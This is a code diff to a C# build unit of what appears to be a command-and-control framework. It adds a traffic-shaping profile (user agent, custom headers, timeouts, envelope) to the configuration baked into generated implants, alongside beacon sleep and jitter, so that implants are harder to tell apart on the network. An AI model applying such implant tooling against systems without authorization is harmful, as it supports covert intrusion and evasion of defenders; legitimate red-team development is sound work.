@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
@@ -121,7 +122,13 @@ public sealed class GoBuildUnit : IBuildUnit
         // the artifact is self-describing: the generated implant carries the verbs
         // it is permitted to run, baked in alongside its profile.
         var verbs = string.Join(",", ImplantClassCapabilities.For(@params.Class));
-        var map = new Dictionary<string, string>
+        // The malleable transport profile (architecture.md Sec 7): the enroll
+        // path, User-Agent, custom headers, request timeout, and body envelope
+        // that shape the wire so two implants do not look the same. Headers ride
+        // as a nested JSON object (an empty profile emits {}) and the envelope is
+        // the lowercase enum name, matching DotNetBuildUnit byte-for-byte. The
+        // header object keys are sorted so two runtimes emit the same bytes.
+        var map = new Dictionary<string, object>
         {
             ["enrollURL"] = @params.Transport.Endpoint,
             ["beaconURL"] = BeaconUrlFromEnroll(@params.Transport.Endpoint),
@@ -129,11 +136,28 @@ public sealed class GoBuildUnit : IBuildUnit
             ["sleep"] = ((long)@params.Beacon.Sleep.TotalSeconds).ToString() + "s",
             ["jitter"] = ((long)@params.Beacon.Jitter.TotalSeconds).ToString() + "s",
             ["uriPath"] = @params.Transport.UriPath,
+            ["enrollPath"] = @params.Transport.EnrollPath,
+            ["userAgent"] = @params.Transport.UserAgent,
+            ["headers"] = RenderHeadersMap(@params.Transport.Headers),
+            ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
+            ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
             ["verbs"] = verbs,
             ["keyFingerprint"] = keyFingerprint,
         };
         var json = JsonSerializer.Serialize(map);
         return Base64Url(Encoding.UTF8.GetBytes(json));
+    }
+
+    // Renders the profile's custom headers as a JSON-object value (a
+    // Dictionary<string,string>, {} when empty) with keys sorted so the Go and
+    // .NET build units emit byte-identical baked profiles regardless of the
+    // runtime's dictionary iteration order.
+    private static Dictionary<string, string> RenderHeadersMap(IReadOnlyDictionary<string, string> headers)
+    {
+        var ordered = new Dictionary<string, string>(StringComparer.Ordinal);
+        foreach (var key in headers.Keys.OrderBy(k => k, StringComparer.Ordinal))
+            ordered[key] = headers[key];
+        return ordered;
     }
 
     // The beacon URL is the enroll endpoint with /implants/enroll stripped. The
